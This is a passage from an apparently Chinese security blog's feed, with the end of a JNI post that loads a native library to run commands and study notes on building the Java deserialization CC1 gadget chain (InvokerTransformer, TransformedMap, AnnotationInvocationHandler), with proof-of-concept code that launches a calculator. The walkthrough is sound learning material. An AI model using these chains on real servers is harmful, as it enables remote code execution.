class="hljs-string">&quot;./libcmd.so&quot;</span>);<br><br>            // load命令执行类<br>            Class commandClass = loader.loadClass(<span class="hljs-string">&quot;com.anbai.sec.cmd.CommandExecution&quot;</span>);<br><br>            java.lang.reflect.Method loadLibraryMethod = ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;loadLibrary&quot;</span>, Class.class, java.io.File.class);<br>            loadLibraryMethod.setAccessible(<span class="hljs-literal">true</span>);<br>            loadLibraryMethod.invoke(ClassLoader.getSystemClassLoader(), commandClass, libPath);<br><br>            String content = (String) commandClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(null, cmd);<br>            System.out.println(content);<br>        &#125; catch (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;error:&quot;</span>);<br>            System.out.println(e);<br>            <span class="hljs-keyword">for</span> (StackTraceElement element : e.getStackTrace()) &#123;<br>                System.out.println(element);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202410201823099.png" alt="null"></p><h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>利用方法就是上面那个样子的，直接调用即可，也不知道会不会再用上，感觉有点鸡肋啊↓</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><p><a href="https://www.javasec.org/java-vuls/JNI.html">https://www.javasec.org/java-vuls/JNI.html</a></p></li><li><p><a href="https://github.com/AMJIYU/javaweb-sec/tree/68791efd17d0dafd33127da49dc0ed51857ede6b/gitbook/javase/JNI">https://github.com/AMJIYU/javaweb-sec/tree/68791efd17d0dafd33127da49dc0ed51857ede6b/gitbook/javase/JNI</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>JNI</tag>
      
      <tag>动态链接库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化CommonsCollections篇之CC1</title>
    <link href="/2024/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E7%AF%87%E4%B9%8BCC1/"/>
    <url>/2024/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections%E7%AF%87%E4%B9%8BCC1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>该博客为参考学习笔记博客，仅为本人记录的笔记，所以欢迎大家去<code>Drunkbaby</code>师傅的博客中进行学习！<a href="https://drun1baby.top/">Drunkbaby’s Blog</a></p></blockquote><p>参考链接：</p><p>​<a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#0x03-Common-Collections-%E7%9B%B8%E5%85%B3%E4%BB%8B%E7%BB%8D">Java反序列化Commons-Collections篇01-CC1链</a></p><p>​<a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=2f4f013cc47c83eaeddc3c7ddb30210b">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a></p><blockquote><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=2f4f013cc47c83eaeddc3c7ddb30210b">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a>这个视频里的师傅讲得已经相当详细了，本篇博客只是记录一些自己不太明白和思路不太清晰的地方，例如Runtime反射明明可以反序列化了，为什么还要调用InvokerTransformer？还有一些自己的思路理解的方向，跟视频中不完全一致，还有视频中没有讲解到的一些地方进行了解析；</p></blockquote><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>环境搭建的方法大家可以参考视频<a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=2f4f013cc47c83eaeddc3c7ddb30210b">Java反序列化CommonsCollections篇(一) CC1链手写EXP</a></p><p>本人使用的环境是：</p><ul><li>JDK8u65(jdk8u71漏洞就已修复无法复现)<ol><li><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">javase8-archive-downloads</a></li><li><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65</a></li></ol></li><li>Maven3.9.5</li></ul><h1 id="二、CommonCollections之TransformMap利用链"><a href="#二、CommonCollections之TransformMap利用链" class="headerlink" title="二、CommonCollections之TransformMap利用链"></a>二、CommonCollections之TransformMap利用链</h1><p>根据之前的URLDNS链可以类似的总结出来反序列化攻击的利用链寻找思路是从后面往前面去找，先找到能够利用的危险函数再往前找利用的链路和类型，我们必须要有危险函数可以实现利用，然后再一步一步往前构造实现利用链；</p><p>重点应该在于<code>不同类的同名函数调用</code>，通过传入危险类的实例作为参数的某个类的实例调用该<code>同名函数</code>实现对<code>危险类该同名危险函数</code>的调用（总之，我们的目的就是调用危险类的的危险函数，但是我们无法直接调用，需要通过反序列化进行调用一些平常函数然后形成链调用危险类的危险函数）；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112148166.png" alt="image-20240811214753984"></p><h2 id="2-1-InvokerTransformer实现命令执行"><a href="#2-1-InvokerTransformer实现命令执行" class="headerlink" title="2.1 InvokerTransformer实现命令执行"></a>2.1 InvokerTransformer实现命令执行</h2><p>这里我们通过查找<code>Transformer</code>接口的实现类查看是否存在相关的实现的java类能够实现命令执行，最后我们再<code>InvokerTransformer</code>中找到了能够实现命令执行的<code>transform</code>方法实现；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112226784.png" alt="image-20240811222607654"></p><p>其中的<code>input</code>作为形参传入，<code>iMethodName</code>、<code>iParamTypes</code>、<code>iArgs</code>三个变量均是类中属性，可以在实例化时对其进行初始化；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112228871.png" alt="image-20240811222820755"></p><p>因此我们可以根据该实现调用<code>Runtime</code>类中的<code>exec</code>实现弹calc计算器；实践开始！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformerReturnCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * public InvokerTransformer(String iMethodName, Class[] iParamTypes, Object[] iArgs);</span><br><span class="hljs-comment">         * iMethodName: 调用方法的名称</span><br><span class="hljs-comment">         * iParamTypes: 调用方法的参数类型</span><br><span class="hljs-comment">         * iArgs: 调用方法传入的参数</span><br><span class="hljs-comment">         * public Object transform(Object input);</span><br><span class="hljs-comment">         * input: 调用方法的实例</span><br><span class="hljs-comment">         * </span><br><span class="hljs-comment">         * Class cls = input.getClass();</span><br><span class="hljs-comment">         * Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="hljs-comment">         * return method.invoke(input, iArgs);</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        invokerTransformer.transform(r);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112240330.png" alt="image-20240811224051191"></p><p>成功弹出计算器，那么我们后续的工作就是寻找利用链了；怎么通过反序列化调用该函数实现命令执行，一步一步往前构造；</p><p>目前，我们就已经实现了上述流程图的最后一步，得到以下的流程图：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112246278.png" alt="image-20240811224636167"></p><h2 id="2-2-TransformedMap调用transform函数"><a href="#2-2-TransformedMap调用transform函数" class="headerlink" title="2.2 TransformedMap调用transform函数"></a>2.2 TransformedMap调用transform函数</h2><p>通过idea自带的<code>查找用法</code>查找存在哪些函数调用了该同名函数<code>transform</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112253462.png" alt="image-20240811225305343"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112253146.png" alt="image-20240811225340029"></p><p>可以看到总共有21个结果；如果结果数量较少或者没有，点击左边的设置，将作用域更改为<code>所有位置</code>即可；</p><p>对于这21个结果呢，其实还是有一部分能够继续构成链的，但是这一部分中，最后能够跟反序列化构成链的应该没几个；</p><p>那么这时候问题就来了</p><p>“那我们在实际情况中应该选哪个呢？”</p><p>“我也不知道！一个个找找看呗，能构成利用链的那个就是啦！人工深搜（dfs）一下”</p><p>在本次中应该选择的是在<code>TransformedMap</code>中的<code>checkSetValue()</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112314287.png" alt="image-20240811231445166"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112316118.png" alt="image-20240811231612014"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112316882.png" alt="image-20240811231622774"></p><p>可以发现的是<code>valueTransformer</code>变量是作为类<code>TransformedMap</code>的属性，应该在其实例化时能够初始化；但是我们发现其构造函数是<code>protected</code>，无法调用其进行初始化；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112318868.png" alt="image-20240811231819757"></p><p>但是，天无绝人之路！还有一个<code>decorate</code>函数能够为我们所用进行实例化；所以我们可以利用该函数其实例化一个指定属性的<code>TransformedMap</code>类的实例；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112318618.png" alt="image-20240811231837514"></p><p>其实，细心的朋友可以发现咱们的<code>checkSetValue</code>函数也是<code>protected</code>的，我们不能够通过<code>TransformedMap</code>实例直接调用该函数，但是最后构造好的利用链的不同类均在内部包中，所以能够调用<code>checkSetValue</code>函数；</p><p>所以，我们目前先通过利用反射测试该方法是否能够成功弹出计算器；实践开始！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMapReturnCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Map</span>&gt; mapClass = transformedMap.getClass();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">checkSetValueMethod</span> <span class="hljs-operator">=</span> mapClass.getDeclaredMethod(<span class="hljs-string">&quot;checkSetValue&quot;</span>, Object.class);<br>        checkSetValueMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        checkSetValueMethod.invoke(transformedMap, r);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112339754.png" alt="image-20240811233939604"></p><p>确实是没有问题的，那么我们现在的利用链已经完善了一部分了，得到以下的流程图：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408112344753.png" alt="image-20240811234442634"></p><h2 id="2-3-MapEntry调用checkSetValue函数"><a href="#2-3-MapEntry调用checkSetValue函数" class="headerlink" title="2.3 MapEntry调用checkSetValue函数"></a>2.3 MapEntry调用checkSetValue函数</h2><p>继续重复刚才查找用法的步骤，可以发现仅存在一个地方调用了同名函数</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408120010643.png" alt="image-20240812001048534"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408120011311.png" alt="image-20240812001110197"></p><p>来到调用函数的地方可以发现该类继承了MapEntry的装饰的抽象类；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408120012094.png" alt="image-20240812001217988"></p><p>同样<code>TransformedMap</code>类也继承了Map输入检查的装饰类。</p><p>这里我们需要知道一个概念就是**<code>Map.Entry</code>就是在Map中的一个键值对（entry）**</p><p>到这里可能会有一点难理解，因为它们均继承了Map的装饰类，在CommonCollections中对Map接口进行了自己的实现，而MapEntry类即是继承<code>AbstractMapEntryDecorator</code> 对<code>Map.Entry</code>接口中<code>setValue</code>方法的实现；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408120022104.png" alt="image-20240812002159979"></p><p>因此，我们在通过<code>decorate</code>函数实例化的<code>Map</code>实例是通过CommonCollection实现的Map，因此该Map的<code>Map.Entry</code>的调用的<code>setValue</code>方法是<code>MapEntry</code>中实现的方法；</p><p>由于<code>MapEntry</code>是继承于<code>Map.Entry</code>的，所以<code>setValue()</code>是通过<code>Map.Entry</code>进行调用的；</p><p>但是说了这么多，其实我们根本也不需要管那个<code>entry</code>，因为跟它没什么关系啊！因为是<code>parent</code>变量在调用<code>checkSetValue</code>函数呀，我们需要的是执行<code>checkSetValue</code>函数；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408120030805.png" alt="image-20240812003036681"></p><p>通过跟踪<code>AbstractInputCheckedMapDecorator</code>类型可以发现，其最终是实现<code>Map</code>接口的，所以可以简单认为其是一个Map类型（不规范啊，别这么认为，方便理解就行）；</p><p>根据查看构造函数<code>MapEntry</code>的用法，大概可以猜测到其应该是一个默认值，即<code>map</code>变量，用来判断每个键值对entry归属于哪个map变量的。（大致理解和猜测，底层代码太多太复杂，看不太懂）；</p><p>至此，可以得出的结论就是，通过entry调用<code>setValue</code>方法即可让map变量调用<code>checkSetValue</code>函数，这其实就已经达到我们的目的啦，因为我们要的就是让map变量调用<code>checkSetValue</code>函数；实践开始！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> CC1</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.candy.MapEntryReturnCalc.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/8/12 0:44</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapEntryReturnCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);    <span class="hljs-comment">// 键值是什么无所谓，主要是得有一对，这样才能取出键值对entry</span><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-keyword">for</span>(Map.Entry entry : transformedMap.entrySet())&#123;<br>            entry.setValue(r);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408120047182.png" alt="image-20240812004702030"></p><p>到这里，构造的利用链仍然没有问题，现在可以得到以下的流程图：（为了方便竖着放了，再横着放图就太长了看不清啦）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408120049200.png" alt="image-20240812004931078"></p><h2 id="2-4-AnnotationInvocationHandler入口类readObject"><a href="#2-4-AnnotationInvocationHandler入口类readObject" class="headerlink" title="2.4 AnnotationInvocationHandler入口类readObject()"></a>2.4 AnnotationInvocationHandler入口类readObject()</h2><p>在完成前面这部分内容之后可能我们会产生一个疑问，就是“什么时候我们这个链才算是结束？”其实就是存在一个重写的<code>readObject()</code>中调用了相应的同名函数；这时候我们可以通过反序列化调用该函数实现链的利用；</p><p>在本次的CC1链中，继续查找<code>setValue</code>函数的用法查找，最后在<code>AnnotationInvocationHandler</code>类中重写<code>readObject</code>函数找到了对该函数的调用；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408122201506.png" alt="image-20240812214541530"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408122147809.png" alt="image-20240812214704690"></p><p>可以看到<code>menberValue</code>变量的内容是跟<code>memberValues</code>变量有关的，也就是取出<code>memberValues</code>中的entry，这样只要我们将相应的map作为<code>memberValues</code>即可使其的entry调用<code>setValue</code>达到我们的目的；</p><p>来到该类的构造函数我们可以发现<code>memberValues</code>属性的值是可控的，我们在构造该类时即可设置相应的<code>memberValues</code>的值；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408122149815.png" alt="image-20240812214913706"></p><p>我们首先尝试一下是否真的如我们所说的一样获得我们想要的属性值；由于<code>AnnotationInvocationHandler</code>类没有设置<code>public</code>属性，默认<code>default</code>，所以不能直接通过<code>new</code>进行实例化对象，因此需要通过反射进行实例化；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandlerReturnCalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br><span class="hljs-comment">//        for(Map.Entry entry : transformedMap.entrySet())&#123;</span><br><span class="hljs-comment">//            entry.setValue(r);</span><br><span class="hljs-comment">//        &#125;</span><br>        Class&lt;?&gt; annotationInvocationhandlerClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationhandlerconstructor = annotationInvocationhandlerClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationhandlerconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">annotationInvocationHandler</span> <span class="hljs-operator">=</span> annotationInvocationhandlerconstructor.newInstance(Override.class, transformedMap);<br>        serialize(annotationInvocationHandler);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408122246097.png" alt="image-20240812224619971"></p><p>通过下断点调试代码可以知道确实如我们所说，<code>memberValues</code>变量确实是我们所设置的参数；继续调试我们会发现我们无法进入<code>447行</code>的if结构中，尝试满足其判断；首先我们需要详细分析一下在<code>AnnotationInvocationHandler</code>类中重写的<code>readObject</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<span class="hljs-comment">//获取我们传入类的</span><br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>其中<code>type</code>是我们自己传入的一个类，通过Chatgpt工具查询一下底层源码的功能我们可以知道<code>annotationType = AnnotationType.getInstance(type);</code>是为了获取type类中的<code>元数据</code>返回一个<code>AnnotationType</code>实例，对该实例在调用<code>memberTypes()</code>将属性名称和类型作为键值对构成<code>Map</code>；可以将<code>type</code>数据传入<code>Target.class</code>进行调试，得到以下结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 